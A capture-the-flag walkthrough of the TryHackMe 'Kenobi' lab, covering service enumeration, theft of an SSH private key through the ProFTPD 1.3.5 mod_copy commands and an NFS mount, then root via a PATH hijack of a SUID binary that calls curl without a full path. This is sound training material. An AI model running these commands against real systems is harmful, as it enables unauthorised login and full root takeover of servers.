# Kenobi
https://tryhackme.com/room/kenobi

---
## Initial Enumeration
IP Address: 10.10.87.210
### gobuster
`gobuster dir -u 10.10.87.210 -w /usr/share/wordlists/dirb/common.txt -x .php,.xml,.html`
<pre> =============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.87.210
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,xml,html
[+] Timeout:        10s
===============================================================
2021/05/19 11:22:32 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.xml (Status: 403)
/.hta.html (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.xml (Status: 403)
/.htaccess.html (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.xml (Status: 403)
/.htpasswd.html (Status: 403)
/admin.html (Status: 200)
/index.html (Status: 200)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2021/05/19 11:25:39 Finished
===============================================================
</pre>

### nmap
`nmap -A -T5 -p- -Pn 10.10.87.210`
<pre>
Nmap scan report for 10.10.87.210
Host is up (0.099s latency).
Not shown: 63967 closed ports, 1557 filtered ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      36198/udp   mountd
|   100005  1,2,3      39776/udp6  mountd
|   100005  1,2,3      58189/tcp6  mountd
|   100005  1,2,3      58293/tcp   mountd
|   100021  1,3,4      37607/udp   nlockmgr
|   100021  1,3,4      38665/tcp6  nlockmgr
|   100021  1,3,4      42741/tcp   nlockmgr
|   100021  1,3,4      47259/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
38731/tcp open  mountd      1-3 (RPC #100005)
42741/tcp open  nlockmgr    1-4 (RPC #100021)
58293/tcp open  mountd      1-3 (RPC #100005)
59689/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-05-19T10:32:19-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-19T15:32:19
|_  start_date: N/A
</pre>

### nikto
`nikto -h 10.10.87.210`
<pre>
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.87.210
+ Target Hostname:    10.10.87.210
+ Target Port:        80
+ Start Time:         2021-05-19 11:23:11 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin.html' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Server may leak inodes via ETags, header found with file /, inode: c8, size: 591b6884b6ed2, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3092: /admin.html: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7890 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-05-19 11:36:57 (GMT-4) (826 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

</pre>
Number of open ports = 11 (but THM has it as 7? need to investigate later)

## Samba Enumeration
1. Run the script in the instructions:
`nmap -p 445 -script=smb-enum-shares.nse,smb-enum-users.nse 10.10.87.210`
<pre>
Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-19 11:43 EDT
Nmap scan report for 10.10.87.210
Host is up (0.097s latency).
PORT    STATE SERVICE
445/tcp open  microsoft-ds
Host script results:
| smb-enum-shares: 
|   account_used: guest                                           
|   \\10.10.87.210\IPC$:                                                     
|     Type: STYPE_IPC_HIDDEN                                                     
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))                       
|     Users: 1                                                                      
|     Max Users: <unlimited>                                                         
|     Path: C:\tmp                                                                  
|     Anonymous access: READ/WRITE                                                  
|     Current user access: READ/WRITE                                               
|   \\10.10.87.210\anonymous:                                                       
|     Type: STYPE_DISKTREE                                                          
|     Comment:                                                                     
|     Users: 0                                                                      
|     Max Users: <unlimited>                                                          
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.87.210\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
</pre>
Using the nmap command above, how many shares have been found? = 3

2. inspect a share:
`smbclient //10.10.87.210/anonymous`

enter your local password

Once you're connected, list the files on the share. What is the file can you see?
`ls`
<pre> log.txt
</pre>
3. `cat log.txt`

cat doesn't work, lets see what commands we have access to

`help`
<pre>
smb: \> help
?              allinfo        altname        archive       backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get          getfacl        
geteas         hardlink       help           history       iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix       posix_encrypt  posix_open    posix_mkdir  posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue         quit         readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea        setmode        
scopy          stat           symlink        tar          tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..   
</pre>

we can read it with 'more' (too much to post here)

`more log.txt`

What port is FTP running on?: 21

4. Use the script shown to enumerate port 111 network file system:

```
ctrl+c
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.87.210
```
<pre>
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
</pre>
What mount can we see?: /var
--- 
## Gain initial access with ProFTPd

1. Use Netcat to connect to the machine on the FTP port

`nc 10.10.87.210 21`
what is the version?: 1.3.5

2. Use searchsploit (CLI version of [exploitdb.com](https://www.exploit-db.com/))
`searchsploit ftp 1.3.5`
<pre>
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | exploits/linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution | exploits/linux/remote/36803.py
ProFTPd 1.3.5 - File Copy | exploits/linux/remote/36742.txt
</pre>
How many exploits are there for ProFTPd?: 3

3.  There is a  vulnerability in the [copy CPFR/CPTO (Copy From/Copy To)](http://www.proftpd.org/docs/contrib/mod_copy.html) commands

lets copy the ssh key to a place we can read it ourselves
`SITE CPFR /home/kenobi/.ssh/id_rsa`
<pre> 350 File or directory exists, ready for destination name </pre>
`SITE CPTO /var/tmp/id_rsa`
<pre> 250 Copy successful </pre>
now the ssh key is someplace we can get to

4. mount the /var/tmp directory to our machine so we can now retrieve that ssh key
- `ctrl+c` to exit the smb interface if you haven't already
```
sudo mkdir /mnt/kenobiNFS  
sudo mount 10.10.87.210:/var /mnt/kenobiNFS  
ls -la /mnt/kenobiNFS
```
lets get the key and use it to connect!
```
cp /mnt/kenobiNFS/tmp/id_rsa ~/Downloads
cd /Downloads
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.87.210
```
we are logged in as Kenobi!
`ls -al`
<pre> share      user.txt </pre>
5. What is Kenobi's user flag?:
`cat user.txt`
XXXXXXX**REDACTED**XXXXXXXXX

## Priv Esc with Path Variable Manipulation
1. lets find all the files with SUID bits
`find / -perm /4000 2>&1 | grep -v "Permission denied"`
<pre>
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
</pre>
What file looks out of the ordinary?: /usr/bin/menu

2. run the binary
```
cd /usr/bin
./menu
```
<pre>
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
</pre>
the options give us:
- an http header of the host
- our kernel version (4.8.0-58-generic)
- an ifconfig output
3. "cat" will give us a bunch of gibberish, so we use "strings" to see any human readable text in the binary
`strings menu`
<pre>
'1. status check'
'2. kernel version'
'3. ifconfig'
** Enter your choice :
curl -I localhost
uname -r
ifconfig
Invalid choice
</pre>

4. looks like these lines are the command activated by the choices made in the binary. Notice that curl is just called locally. This means that it will use whatever binary named "curl" that is in the same directory as "menu". we can change this to a command that will give us root!
```
cd ~
echo /bin/sh > curl
chmod 777 curl
export PATH=~:$PATH
/usr/bin/menu
```
select 1 to make the menu go to our shell named "curl".
`id`
<pre> id=0(root) gid=1000(kenobi) groups=1000(kenobi) </pre>
We are root!

5. What is the root flag (/root/root.txt)?
```
cd ~
cat /root/root.txt
```
Root flag: XXXXXXXREDACTEDXXXXXXX
